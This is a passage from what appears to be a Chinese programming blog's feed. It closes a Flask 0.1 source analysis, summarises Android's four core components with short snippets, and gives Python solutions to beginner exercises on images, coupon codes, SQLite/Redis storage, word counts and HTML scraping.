<p>所以最终看起来会是这样一个数据结构：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    &apos;thread_id1&apos;:&#123;&apos;stack&apos;:[_RequestContext()]&#125;,</div><div class="line">    &apos;thread_id2&apos;:&#123;&apos;stack&apos;:[_RequestContext()]&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>至此，Flask0.1版本的源码已经大致分析完成，其实如果继续下去的话，还有很多值得深究的地方，待后续有时间继续深入分析。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Flask是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 。&lt;/p&gt;
    
    </summary>
    
      <category term="Python进阶" scheme="https://maoao530.github.io/categories/Python%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="Flask" scheme="https://maoao530.github.io/tags/Flask/"/>
    
  </entry>
  
  <entry>
    <title>Android四大组件</title>
    <link href="https://maoao530.github.io/2016/08/11/android-base/"/>
    <id>https://maoao530.github.io/2016/08/11/android-base/</id>
    <published>2016-08-11T01:59:38.000Z</published>
    <updated>2016-12-11T06:14:16.074Z</updated>
    
    <content type="html"><![CDATA[<p>复习Android四大组件内容。</p>
<a id="more"></a>
<p>本文会总结介绍Android组件中最为常见用的四大组件：Activity，Service服务,ContentProvider内容提供者，BroadcastReceiver广播接收者。</p>
<h1 id="1-Activity"><a href="#1-Activity" class="headerlink" title="1 Activity"></a>1 Activity</h1><p>在一个android应用中，一个Activity通常就是一个单独的屏幕，它上面可以显示一些控件也可以监听并处理用户的事件做出响应。Activity之间通过Intent进行通信。</p>
<h2 id="1-1-主要函数"><a href="#1-1-主要函数" class="headerlink" title="1.1 主要函数"></a>1.1 主要函数</h2><p><img src="/img/archives/activity-main.png" alt="主要函数"></p>
<h2 id="1-2-生命周期"><a href="#1-2-生命周期" class="headerlink" title="1.2 生命周期"></a>1.2 生命周期</h2><p><img src="/img/archives/activity-shengming-zhouqi.png" alt="生命周期"></p>
<h2 id="1-3-AndroidManifest-xml文件配置"><a href="#1-3-AndroidManifest-xml文件配置" class="headerlink" title="1.3 AndroidManifest.xml文件配置"></a>1.3 AndroidManifest.xml文件配置</h2><p>需要在apk的AndroidManifest配置文件中进行配置：</p>
<p><img src="/img/archives/activity-androidmanifest.png" alt="配置"></p>
<h2 id="1-4-Activity管理"><a href="#1-4-Activity管理" class="headerlink" title="1.4 Activity管理"></a>1.4 Activity管理</h2><p>activity在android里面是以栈的形式管理的，处于前台的 Activity 总是在栈的顶端，当前台的 Activity 因为异常或其它原因被销毁时，处于栈第二层的 Activity 将被激活，上浮到栈顶。当新的 Activity 启动入栈时，原 Activity 会被压入到栈的第二层。如下：</p>
<p><img src="/img/archives/activity-stack.png" alt="activity管理"></p>
<h2 id="1-5-通信"><a href="#1-5-通信" class="headerlink" title="1.5 通信"></a>1.5 通信</h2><ol>
<li>activity之间通过Intent进行通信，可以将数据放入Bundle中，再将Bundle放入intent中，实现数据通信。</li>
<li>可以通过intent去启动一个activity，方式有显示Intent和隐式Intent。<br>2.1 显示<br>直接指明启动的Activity类：Context.startActivity(new Intent(this,xxx.class))<br>2.2 隐式<br>需要在Activity对应的AndroidManifest.xml中配置对应的Intent-Filter中的action和category，一般默认category属性需要有一个default属性(如果有其它category则不用添加此属性)：<code>&lt;category android:name=”android.Intent.Category.DEFAULT” /&gt;</code><br>这是因为Android把所有传给startActivity()的隐式意图当作他们包含至少一个类别<code>&quot;android.intent.category.DEFAULT&quot;</code> </li>
</ol>
<p><img src="/img/archives/activity-intent.png" alt="intent通信"></p>
<h1 id="2-Service"><a href="#2-Service" class="headerlink" title="2 Service"></a>2 Service</h1><p>Service作为Android四大组件之一，在每一个应用程序中都扮演着非常重要的角色。它主要用于在后台处理一些耗时的逻辑，或者去执行某些需要长期运行的任务。必要的时候我们甚至可以在程序退出的情况下，让Service在后台继续保持运行状态。</p>
<h2 id="2-1-生命周期"><a href="#2-1-生命周期" class="headerlink" title="2.1 生命周期"></a>2.1 生命周期</h2><p>Service生命周期函数比较简单：</p>
<p><img src="/img/archives/service-shengming-zhouqi.png" alt="service生命周期"></p>
<h2 id="2-2-Local-Remote-Service"><a href="#2-2-Local-Remote-Service" class="headerlink" title="2.2 Local/Remote Service"></a>2.2 Local/Remote Service</h2><ol>
<li><p>service分为<code>local service</code> 和 <code>remote service</code>，本地服务的生命周期是和主进程相关的，主进程结束的时候service也结束了，远程服务则为独立的进程和主进程没有关系。</p>
</li>
<li><p>local service 使用bindService启动service，用unBindService关闭service</p>
</li>
<li><p>remote service 使用startService和stopService启动和关闭Service</p>
</li>
<li><p><strong>通信：</strong><br>4.1 Local service ：是运行在主进程的main线程下的，在同一个进程，通信的方式通过返回一个IBinder，然后比如说可以在ui线程中去接收ibinder进行通信，可以吧。<br>4.2 Remote service：因为是独立进程，所以如果需要和其它进程进行通信，则需要通过aidl进行ipc通信</p>
</li>
<li><p>如果需要比较耗时的操作，可以在service中开一个新的线程进行操作，避免阻塞ui线程产生anr，或者使用IntentService，因为IntentService会开启单独的线程来处理所有的Intent请求</p>
</li>
</ol>
<p>关于Service其他本文不做过多说明，都是一些比较常用的知识。</p>
<h1 id="3-BroadcastReceiver"><a href="#3-BroadcastReceiver" class="headerlink" title="3 BroadcastReceiver"></a>3 BroadcastReceiver</h1><p>BroadcastReceiver即广播接受者，是一种全局的监听器，可以用来作为不同组件之间的通信，比如说activity和service之间的通信可以借助其实现。</p>
<h2 id="3-1-启动方式"><a href="#3-1-启动方式" class="headerlink" title="3.1 启动方式"></a>3.1 启动方式</h2><p>Context.sendBroadcast() 或者Context.sendOrderedBroadcast()</p>
<h2 id="3-2-接收方式"><a href="#3-2-接收方式" class="headerlink" title="3.2 接收方式"></a>3.2 接收方式</h2><p>重写BroadcastReceiver的onReceive()方法</p>
<h2 id="3-3-实现方式"><a href="#3-3-实现方式" class="headerlink" title="3.3 实现方式"></a>3.3 实现方式</h2><p>BoradcastReceiver实现方式有两种，一是通过代码注册，二是通过Androidmanifest.xml方式配置：</p>
<p>方式一，代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">IntentFilter   filter  =   <span class="keyword">new</span> IntentFilter(“xxx.xxx.xxx.xxxAction”);</div><div class="line">XxxReceiver   receiver  =  XxxReceiver();</div><div class="line">Context.registerReceiver( receiver,filter);</div></pre></td></tr></table></figure>
<p>方式二，Androidmanifest.xml<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt; receiver android:name = ".XxxReceiver" &gt;</div><div class="line">    &lt; intent-filter  android:priority=”1000”&gt;         </div><div class="line">        &lt; action android:name = " xxx.xxx.xxx.xxxAction" /&gt;</div><div class="line">    &lt;/ intent-filter &gt;</div><div class="line">&lt;/ receiver &gt;</div></pre></td></tr></table></figure></p>
<p>每次广播事件发生后，系统会创建对应的BroadcastReceiver实例，并且去触发onReceive方法，这个方法执行完毕后，BroadcastReceiver实例会被销毁，因为BroadcastReceiver生命周期短，超过10s会产生anr对话框，所以不要在onReceive里面做一些耗时的操作，如果需要耗时操作，可以用Intent开启一个Service来完成而不是开启一个新的子线程去完成，因为可能子线程还没结束，BroadcastReceiver就已经结束退出了。</p>
<h2 id="3-4-普通广播和有序广播"><a href="#3-4-普通广播和有序广播" class="headerlink" title="3.4 普通广播和有序广播"></a>3.4 普通广播和有序广播</h2><ol>
<li><p>普通广播：<br>普通广播是完全异步的，即发送一个广播，所有注册了action相同的BroadcastReceiver都能同时接收到，传递的效率比较高。</p>
</li>
<li><p>有序广播：<br>顾名思义，需要设置广播的顺序，设置的方式有两种，一种是在代码中：IntentFilter.setPriority(Int  order)设置，一种是在AndroidManifest.xml中设置&lt; intent-filter  android:priority=”1000”&gt;，order值范围为[-1000, 1000]，1000为最高优先级，也就是说当你发送了一个广播，优先级高的BroadcastReceiver会先接收，然后传递给下一个优先级低的BroadcastReceiver，层层传递，然后还可以在优先级高的终止广播的往下传递，或者可以向下一个广播传递新的数据信息，具体方式如下<br>优先级高的广播发送信息：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Bundle bundle = <span class="keyword">new</span> Bundle();</div><div class="line">bundle.putString(“info”,”优先级高的就是爽！！”);</div><div class="line">setResultExtras(bundle);</div><div class="line"><span class="comment">// 甚至可以取消广播继续传递</span></div><div class="line"><span class="comment">// abortBroadcast()</span></div><div class="line">优先级低的接收信息：</div><div class="line">Bundle bundle = getResultExtras(<span class="keyword">true</span>);</div><div class="line">String info = bundle.getString(“info”);</div></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="4-ContentProvider"><a href="#4-ContentProvider" class="headerlink" title="4 ContentProvider"></a>4 ContentProvider</h1><p>ContentProvider即内容提供者，简单来讲它的作用就是将一个app的数据提供给其它app进行操作，比如增删改查等。<br>一个典型的例子，比如说我们会经常遇到有应用软件需要读取手机的联系人，这时候就需要联系人应用的ContentProvider功能提供数据的crud操作。<br>ContentProvider的功能是提供数据的增删改查，而其它应用想访问ContentProvider的crud操作，则需要通过ContentResolver的增删改查功能实现，通过uri作为媒介，比如其它应用想去读取联系人，则模型如下：</p>
<p><img src="/img/archives/contentprovider-model.png" alt="ContentProvider-Model"></p>
<h2 id="4-1-URI"><a href="#4-1-URI" class="headerlink" title="4.1 URI"></a>4.1 URI</h2><p>uri由三部分组成，协议+主机名+路径：</p>
<ul>
<li><strong>scheme：</strong> ContentProvider（内容提供者）的scheme已经由Android所规定为：<code>content://</code>。  </li>
<li><strong>主机名（或Authority）：</strong> 用于唯一标识这个ContentProvider，外部调用者可以根据这个标识来找到它。</li>
<li><strong>路径（path）：</strong>可以用来表示我们要操作的数据，路径的构建应根据业务而定，如下：要操作contact表中id为10的记录，可以构建这样的路径<br>: <code>/contact/10</code></li>
</ul>
<p>一个uri例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">content://com.shun.provider.myapp/contact/2</div></pre></td></tr></table></figure></p>
<p>如果要把一个字符串转换成Uri，可以使用Uri类中的parse()方法，如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Uri uri = Uri.parse(<span class="string">"content://com.changcheng.provider.contactprovider/contact"</span>)</div></pre></td></tr></table></figure>
<h2 id="4-2-实现ContentProvider"><a href="#4-2-实现ContentProvider" class="headerlink" title="4.2 实现ContentProvider"></a>4.2 实现ContentProvider</h2><p>实现一个ContentProvider有两个步骤：</p>
<ol>
<li>开发一个ContentProvider的子类，然后去实现它的<code>query</code>，<code>delete</code>，<code>update</code>，<code>insert</code>方法，然后还要使用<code>UriMatcher</code>对uri进行匹配过滤</li>
<li>在androidmanifest.xml中配置它，需要指定android:authorities方法（唯一主机名）<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;provider android:name=&quot;MyProvider&quot; android:authorities=&quot; com.shun.provider.myapp &quot; /&gt;</div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="4-3-ContentResolver"><a href="#4-3-ContentResolver" class="headerlink" title="4.3 ContentResolver"></a>4.3 ContentResolver</h2><p>ContentResolver的使用则比较简单了：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Context.getContentResolver().query(…)</div><div class="line">Context.getContentResolver().delete(…)</div><div class="line">Context.getContentResolver().update(…)</div><div class="line">Context.getContentResolver().insert(…)</div></pre></td></tr></table></figure></p>
<p>当然，上面这些个crud方法返回值肯定不一样，具体参考google官网</p>
<h2 id="4-4-ContentObserver"><a href="#4-4-ContentObserver" class="headerlink" title="4.4 ContentObserver"></a>4.4 ContentObserver</h2><p>ContentObserver即内容观察者，可以监听ContentProvider数据的改变，实现一个内容观察者步骤如下：</p>
<ol>
<li>实现一个ContentObserver的子类，实现onChange()方法，每当有数据改变时会触发此方法</li>
<li>注册监听器，比如监听短信信息：<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Uri smsUri = Uri.parse(<span class="string">"content://sms"</span>);  </div><div class="line">getContentResolver().registerContentObserver(smsUri, <span class="keyword">true</span>, <span class="keyword">new</span> smsContentObserver());</div></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;复习Android四大组件内容。&lt;/p&gt;
    
    </summary>
    
      <category term="Android基础" scheme="https://maoao530.github.io/categories/Android%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Android" scheme="https://maoao530.github.io/tags/Android/"/>
    
      <category term="Activity" scheme="https://maoao530.github.io/tags/Activity/"/>
    
      <category term="Service" scheme="https://maoao530.github.io/tags/Service/"/>
    
      <category term="BroadcastReceiver" scheme="https://maoao530.github.io/tags/BroadcastReceiver/"/>
    
      <category term="ContentProvider" scheme="https://maoao530.github.io/tags/ContentProvider/"/>
    
  </entry>
  
  <entry>
    <title>python每日编程训练</title>
    <link href="https://maoao530.github.io/2016/08/10/python-show-me-the-code/"/>
    <id>https://maoao530.github.io/2016/08/10/python-show-me-the-code/</id>
    <published>2016-08-10T05:47:00.000Z</published>
    <updated>2016-12-10T14:05:45.528Z</updated>
    
    <content type="html"><![CDATA[<p>python 编程练习</p>
<p>python 每日编程训练。（本文使用Python 3.5）</p>
<p>来源于 - <a href="https://github.com/Yixiaohan/show-me-the-code" target="_blank" rel="external">https://github.com/Yixiaohan/show-me-the-code</a></p>
<a id="more"></a>
<p>本文以问题加源码的形式发布。</p>
<h1 id="第-0000-题"><a href="#第-0000-题" class="headerlink" title="第 0000 题"></a>第 0000 题</h1><p>第 0000 题：将你的 QQ 头像（或者微博头像）右上角加上红色的数字，类似于微信未读信息数量那种提示效果。 类似于图中效果<br><img src="/img/archives/python-coding-0000.png" alt="0000-image"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageDraw, ImageFont</div><div class="line"></div><div class="line">image = Image.open(<span class="string">'0000.png'</span>, <span class="string">'r'</span>)</div><div class="line">font = ImageFont.truetype(<span class="string">'c:/Windows/Fonts/Arial.ttf'</span>, <span class="number">36</span>)</div><div class="line">draw = ImageDraw.Draw(image)</div><div class="line"></div><div class="line">w,h = image.size</div><div class="line"><span class="comment">#左上角</span></div><div class="line">draw.text(xy=(<span class="number">10</span>, <span class="number">10</span>), text=<span class="string">'9'</span>, fill=(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>), font=font)</div><div class="line">image.save(<span class="string">'0000-new.png'</span>, <span class="string">'png'</span>)</div></pre></td></tr></table></figure>
<h1 id="第-0001-题"><a href="#第-0001-题" class="headerlink" title="第 0001 题"></a>第 0001 题</h1><p>第 0001 题：做为 Apple Store App 独立开发者，你要搞限时促销，为你的应用生成激活码（或者优惠券），<br>使用 Python 如何生成 200 个激活码（或者优惠券）？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> uuid</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</div><div class="line">    <span class="comment"># the str length is 32 bytes</span></div><div class="line">    print(i,  <span class="string">' ====&gt; '</span> , <span class="string">''</span>.join(str(uuid.uuid4()).split(<span class="string">'-'</span>)))</div></pre></td></tr></table></figure>
<h1 id="第-0002-题"><a href="#第-0002-题" class="headerlink" title="第 0002 题"></a>第 0002 题</h1><p>第 0002 题：将 0001 题生成的 200 个激活码（或者优惠券）保存到 MySQL 关系型数据库中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> uuid</div><div class="line"><span class="keyword">import</span> sqlite3</div><div class="line"></div><div class="line"><span class="comment"># create database</span></div><div class="line">conn = sqlite3.connect(<span class="string">'0002.db'</span>)</div><div class="line">cursor = conn.cursor()</div><div class="line">sql = <span class="string">'create table if not exists save_code (id varchar(20) primary key, save_code varchar(50), is_use varchar(10))'</span></div><div class="line">cursor.execute(sql)</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</div><div class="line">    <span class="comment"># generate str, length is 32 bytes</span></div><div class="line">    s = <span class="string">''</span>.join(str(uuid.uuid4()).split(<span class="string">'-'</span>))</div><div class="line">    print(i,  <span class="string">' ====&gt; '</span> , s)</div><div class="line">    <span class="comment"># insert into sqlite3</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        insert_sql = <span class="string">"insert into save_code (id, save_code, is_use) values ('%s', '%s', '%s')"</span> %(str(i), s, <span class="string">'no'</span>)</div><div class="line">        cursor.execute(insert_sql)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        print(<span class="string">'you had insert the save_code'</span>)</div><div class="line">        <span class="keyword">break</span></div><div class="line"><span class="comment"># select and check</span></div><div class="line">select_sql = <span class="string">'select * from save_code'</span></div><div class="line">rs = cursor.execute(select_sql).fetchall()</div><div class="line"><span class="keyword">for</span> r <span class="keyword">in</span> rs:</div><div class="line">    print(r)</div><div class="line"></div><div class="line"><span class="comment"># close resource</span></div><div class="line">cursor.close()</div><div class="line">conn.commit()</div><div class="line">conn.close()</div></pre></td></tr></table></figure>
<h1 id="第-0003-题"><a href="#第-0003-题" class="headerlink" title="第 0003 题"></a>第 0003 题</h1><p>第 0003 题：将 0001 题生成的 200 个激活码（或者优惠券）保存到 Redis 非关系型数据库中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> uuid</div><div class="line"><span class="keyword">import</span> redis</div><div class="line"></div><div class="line">r = redis.Redis(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">6379</span>, db=<span class="number">0</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</div><div class="line">    <span class="comment"># generate str, length is 32 bytes</span></div><div class="line">    s = <span class="string">''</span>.join(str(uuid.uuid4()).split(<span class="string">'-'</span>))</div><div class="line">    print(i,  <span class="string">' ====&gt; '</span> , s)</div><div class="line">    r.lpush(<span class="string">'save_code'</span>,s)</div><div class="line"></div><div class="line">r.flushdb()</div></pre></td></tr></table></figure>
<h1 id="第-0004-题"><a href="#第-0004-题" class="headerlink" title="第 0004 题"></a>第 0004 题</h1><p>第 0004 题：任一个英文的纯文本文件，统计其中的单词出现的个数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line"><span class="keyword">with</span> open(<span class="string">'doc.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">    data = f.read()</div><div class="line">    words = re.compile(<span class="string">r'([a-zA-Z]+)'</span>).findall(data)</div><div class="line"></div><div class="line">dicts = &#123;&#125;</div><div class="line"><span class="keyword">for</span> word <span class="keyword">in</span> words:</div><div class="line">    <span class="keyword">if</span> dicts.get(word) == <span class="keyword">None</span>:</div><div class="line">        dicts[word] = <span class="number">1</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        dicts[word] = dicts[word] + <span class="number">1</span></div><div class="line">    </div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> dicts:</div><div class="line">    print(k, <span class="string">' ==&gt; '</span>, dicts[k])</div></pre></td></tr></table></figure>
<h1 id="第-0005-题"><a href="#第-0005-题" class="headerlink" title="第 0005 题"></a>第 0005 题</h1><p>第 0005 题：你有一个目录，装了很多照片，把它们的尺寸变成都不大于 iPhone5 分辨率的大小。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">images = [ x <span class="keyword">for</span> x <span class="keyword">in</span> os.listdir(<span class="string">'.'</span>) <span class="keyword">if</span> os.path.splitext(x)[<span class="number">1</span>] == <span class="string">'.png'</span> <span class="keyword">or</span> os.path.splitext(x)[<span class="number">1</span>] == <span class="string">'.png'</span>]</div><div class="line"></div><div class="line">iphone5_w = <span class="number">64</span></div><div class="line">iphone5_h = <span class="number">113</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> image <span class="keyword">in</span> images:</div><div class="line">    print()</div><div class="line">    img = Image.open(image, <span class="string">'r'</span>)</div><div class="line">    w, h = img.size</div><div class="line">    scaleXY = max(w / iphone5_w, h / iphone5_h)</div><div class="line">    print(scaleXY)</div><div class="line">    <span class="keyword">if</span> scaleXY &gt; <span class="number">1.0</span> : </div><div class="line">        img.thumbnail((w/scaleXY, h/scaleXY))</div><div class="line">        img.save(os.path.splitext(image)[<span class="number">0</span>]+<span class="string">'_n'</span>+os.path.splitext(image)[<span class="number">1</span>], os.path.splitext(image)[<span class="number">1</span>][<span class="number">1</span>:])</div></pre></td></tr></table></figure>
<h1 id="第-0006-题"><a href="#第-0006-题" class="headerlink" title="第 0006 题"></a>第 0006 题</h1><p>第 0006 题：你有一个目录，放了你一个月的日记，都是 txt，为了避免分词的问题，假设内容都是英文，请统计出你认为每篇日记最重要的词。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line">DIR_NAME = <span class="string">'dir'</span></div><div class="line"></div><div class="line">docs = os.listdir(DIR_NAME)</div><div class="line"></div><div class="line"><span class="keyword">for</span> doc <span class="keyword">in</span> docs:</div><div class="line">    <span class="keyword">with</span> open(os.path.join(DIR_NAME,doc), <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">        data = f.read()</div><div class="line">        words = re.compile(<span class="string">r'([a-zA-Z]+)'</span>).findall(data)</div><div class="line">    dicts = &#123;&#125;</div><div class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> words:</div><div class="line">        <span class="keyword">if</span> dicts.get(word) == <span class="keyword">None</span>:</div><div class="line">            dicts[word] = <span class="number">1</span> </div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            dicts[word] = dicts[word] + <span class="number">1</span></div><div class="line">    </div><div class="line">    maxValue = max(dicts.values())</div><div class="line">    </div><div class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> dicts:</div><div class="line">        <span class="keyword">if</span> dicts[k] == maxValue:</div><div class="line">            print(doc, <span class="string">' ==&gt; '</span>, k,dicts[k])</div></pre></td></tr></table></figure>
<h1 id="第-0007-题"><a href="#第-0007-题" class="headerlink" title="第 0007 题"></a>第 0007 题</h1><p>第 0007 题：有个目录，里面是你自己写过的程序，统计一下你写过多少行代码。包括空行和注释，但是要分别列出来。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line">DIR_NAME = <span class="string">'dir'</span></div><div class="line">docs = os.listdir(DIR_NAME)</div><div class="line"></div><div class="line"><span class="keyword">for</span> doc <span class="keyword">in</span> docs:</div><div class="line">    lines = <span class="number">0</span></div><div class="line">    comment_lines = <span class="number">0</span></div><div class="line">    blank_lines = <span class="number">0</span></div><div class="line">    <span class="keyword">with</span> open(os.path.join(DIR_NAME,doc), <span class="string">'r'</span>, encoding = <span class="string">'utf8'</span>, errors = <span class="string">'ignore'</span>) <span class="keyword">as</span> f:</div><div class="line">        multi_comment_line_start = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():    </div><div class="line">            lines += <span class="number">1</span></div><div class="line">            <span class="comment"># 忽略所有空格</span></div><div class="line">            line = line.split()          </div><div class="line">            <span class="keyword">if</span> len(line) == <span class="number">0</span>:</div><div class="line">                blank_lines += <span class="number">1</span></div><div class="line">            <span class="keyword">elif</span> line[<span class="number">0</span>].startswith(<span class="string">'#'</span>):</div><div class="line">                comment_lines += <span class="number">1</span></div><div class="line">            <span class="keyword">elif</span> line[<span class="number">0</span>].startswith(<span class="string">"'''"</span>) <span class="keyword">and</span> multi_comment_line_start == <span class="number">0</span>:</div><div class="line">                multi_comment_line_start = lines</div><div class="line">            <span class="keyword">elif</span> line[<span class="number">0</span>].startswith(<span class="string">"'''"</span>):</div><div class="line">                comment_lines = comment_lines + (lines - multi_comment_line_start + <span class="number">1</span>)</div><div class="line">                multi_comment_line_start = <span class="number">0</span> </div><div class="line">    print(<span class="string">'========================'</span>)       </div><div class="line">    print(doc,<span class="string">' : '</span>)</div><div class="line">    print(<span class="string">'lines'</span>,lines)</div><div class="line">    print(<span class="string">'comment_lines'</span>, comment_lines)</div><div class="line">    print(<span class="string">'blank_lines'</span>, blank_lines)</div></pre></td></tr></table></figure>
<h1 id="第-0008-题"><a href="#第-0008-题" class="headerlink" title="第 0008 题"></a>第 0008 题</h1><p>第 0008 题：一个HTML文件，找出里面的正文。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url = <span class="string">'http://www.baidu.com'</span></div><div class="line">page = requests.get(url)</div><div class="line">soup = BeautifulSoup(page.text, <span class="string">'html.parser'</span>)</div><div class="line">print(soup.getText())</div></pre></td></tr></table></figure>
<h1 id="第-0009-题"><a href="#第-0009-题" class="headerlink" title="第 0009 题"></a>第 0009 题</h1><p>第 0009 题：一个HTML文件，找出里面的链接。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url = <span class="string">'http://www.baidu.com'</span></div><div class="line">page = requests.get(url)</div><div class="line">soup = BeautifulSoup(page.text, <span class="string">'html.parser'</span>)</div><div class="line"><span class="keyword">for</span> link <span class="keyword">in</span> soup.find_all(<span class="string">'a'</span>):</div><div class="line">    print(link.get(<span class="string">'href'</span>))</div></pre></td></tr></table></figure>
